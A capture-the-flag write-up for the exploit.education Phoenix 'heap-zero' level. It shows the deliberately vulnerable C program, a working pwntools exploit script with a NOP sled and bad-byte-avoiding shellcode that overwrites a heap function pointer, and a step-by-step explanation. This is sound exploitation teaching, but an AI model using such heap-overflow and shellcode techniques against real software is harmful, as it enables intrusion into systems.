# Heap Zero

## Code
```c
/*
 * phoenix/heap-zero, by https://exploit.education
 *
 * Can you hijack flow control, and execute the winner function?
 *
 * Why do C programmers make good Buddhists?
 * Because they're not object orientated.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

struct data {
  char name[64];
};

struct fp {
  void (*fp)();
  char __pad[64 - sizeof(unsigned long)];
};

void winner() {
  printf("Congratulations, you have passed this level\n");
}

void nowinner() {
  printf(
      "level has not been passed - function pointer has not been "
      "overwritten\n");
}

int main(int argc, char **argv) {
  struct data *d;
  struct fp *f;

  printf("%s\n", BANNER);

  if (argc < 2) {
    printf("Please specify an argument to copy :-)\n");
    exit(1);
  }

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  strcpy(d->name, argv[1]);

  printf("data is at %p, fp is at %p, will be calling %p\n", d, f, f->fp);
  fflush(stdout);

  f->fp();

  return 0;
}
```

## Payload

```python
#!/usr/bin/env python
from pwn import *

SLED_LENGTH = 15    # Arbitrary length of a sled
BUFFER_LEN = 80 # Space of buffer until we overflow target addr
WINNER_FUNC = 0x400abd    # Addr of winner() -- has bad chars so we need to calculate
BEG_HEAP = 0x7ffff7ef6010   # Addr of the start of heap segment we control
                            # we will jump to this 

# * Build shellcode to load partial addr of winner() then add value to it to avoid bad bytes
# * We can't use "mov eax" either because that contains null-bytes which will be removed by us later
# * build the payload using "mov ax" and doing math on the registers to get the desired address

# xor eax, eax
# mov ax, 0x40
# shl eax, 0x10
# mov ax, 0x0ace
# jmp eax

# print(f"Subtracted 0xf0 from winner() addr: {(safe_winner)}")
sc = asm('xor eax, eax')
sc += asm('mov al, 0x40')
sc += asm('shl eax, 0x10')
sc += asm('mov ax, 0x0abd')
sc += asm('jmp eax')
print(disasm(sc))

payload = asm('nop') * SLED_LENGTH
payload += sc
payload += b'A' * (BUFFER_LEN - len(sc) - SLED_LENGTH)
payload += p64(BEG_HEAP)

# print(pwnlib.encoders.encoder.encode(payload, b'\x00', force=True))
# print(f"Payload before null removal: {payload}")

if b"\x00" in payload:
    print("[+] Removing null bytes!")
    payload = payload.replace(b"\x00", b"")
else:
    print("[+] No null bytes were removed")

# print(f"Payload after null removal: {payload}")
# print(len(payload))
# with open("./heap-zero-payload", "wb") as fd:
#     fd.write(payload)

p = process(["/opt/phoenix/amd64/heap-zero", payload])
print(p.recvall())
```

## Solution

- Based on the code above, the path to the goal of calling the function `winner()` is clear. There are two allocations that happen in the `main()` function for `d` and `f`. `d` becomes a pointer to a struct `data` which contains a buffer for a name which is provided by us via `argv[1]`. `f` is becomes a pointer to a struct `fp` which contains a void pointer which is later used as a function pointer. After the allocations, there is our wonderful insecure `strcpy()` function that copies our input from `argv[1]` into the `name` field of the `data` struct which is pointed to by `d`. This means that our string will be stored on the heap right before the `fp` struct which is pointed to by `f`. This means we can overflow the heap chunks allocated for `d->name` into the `f->fp` which should give us control of program execution. Let's try! 

- After the two calls to `malloc()` we can see that we have space given to us on the heap:

![](Pasted%20image%2020210413002114.png)

- This image above shows the space allocated for the `data` and `fp` structs. Halfway through you can see the address of the `nowinner()` function stored on the heap in the `fp` struct which `f` points to. We can now try giving some large input and see what happens.

![](Pasted%20image%2020210413002327.png)

- Here we gave 80 bytes of input in the form of `A`'s. We can clearly see that we have smashed through our chunk of the heap and overwritten the chunk header information that existed previously. We also added an extra byte `\xbd` which should overflow the lowest byte of the function pointer address and execute the `winner()` function. Unfortunately this does not happen for some reason. My suspicion lies with the byte `0x0a` which is a newline character. If you refer to the first screenshot, you can see that this byte exists in the value of `f->fp`.

- I am dumb and forgot that `0x0a` will stop `strcpy()` from continuing to copy bytes from source to the destination. This means that when we try to corrupt the address `strcpy()` will stop copying, and copy in a null byte which messes with any attempts to directly modify the value that `f->fp` contains. Luckily, the heap is executable so we can put shellcode there and return to it! 

![](Pasted%20image%2020210413004506.png)

- Although we can execute shellcode, we must take care to not have any _bad characters_ like null bytes or newlines which would stop `strcpy()` from copying all of our payload. Another thing we must keep in mind is that we are trying to call the function `winner()`. We can do this by pointing the function pointer into the heap segment we control and putting shellcode to jump to the `winner()` function. However, remember that `winner()` has a bad byte `0x0a` in its address. This means we will have to craft the address of `winner()` using some math to get around this bad char in our payload.

- To get around the back characters we can use the following shellcode:

![](Pasted%20image%2020210414115343.png)

- As you can see, the assembly code builds our target address by loading it in and shifting it around. We can't use `move eax` because this instruction will have null bytes which are not allowed as input and will be removed by our exploit script thus breaking the opcode. This method allows us to still exploit the target and avoid bad characters. Finally, you can see in the image above that `EIP` contains our target address which is the `winner()` function!

- All we do now is write the code in `heap0-exploit.py` and execute it to beat the level!

![](Pasted%20image%2020210414115759.png)